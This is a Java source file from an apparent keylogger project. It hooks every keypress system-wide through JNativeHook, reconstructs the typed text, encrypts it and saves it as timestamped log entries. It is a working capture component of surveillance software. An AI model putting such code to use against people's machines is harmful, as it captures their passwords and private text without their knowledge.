package com.keyguard.javakeyguard.keylogger.capture;

import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;
import com.keyguard.javakeyguard.keylogger.reconstruction.ReconstructionService;
import com.keyguard.javakeyguard.keylogger.storage.LogStorageService;
import com.keyguard.javakeyguard.model.EncryptedLogEntry;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.time.Instant;
import java.util.concurrent.atomic.AtomicLong;

public class GlobalKeyListener implements NativeKeyListener {

    private final ReconstructionService reconstructionService = new ReconstructionService();
    private final EncryptionService encryptionService = new EncryptionService();
    private final LogStorageService logStorageService = new LogStorageService();
    private final AtomicLong idGenerator = new AtomicLong(1);

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String reconstructed = reconstructionService.handleKeyPressed(e);

        if (reconstructed == null || reconstructed.isBlank()) {
            return;
        }

        String encryptedPayload = encryptionService.encrypt(reconstructed);

        EncryptedLogEntry entry = new EncryptedLogEntry(
                idGenerator.getAndIncrement(),
                Instant.now().toString(),
                "Unknown Window",
                "keyboard",
                encryptedPayload
        );

        logStorageService.save(entry);
//        System.out.println("Reconstructed: " + reconstructed);
//        System.out.println("Encrypted: " + encryptedPayload);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}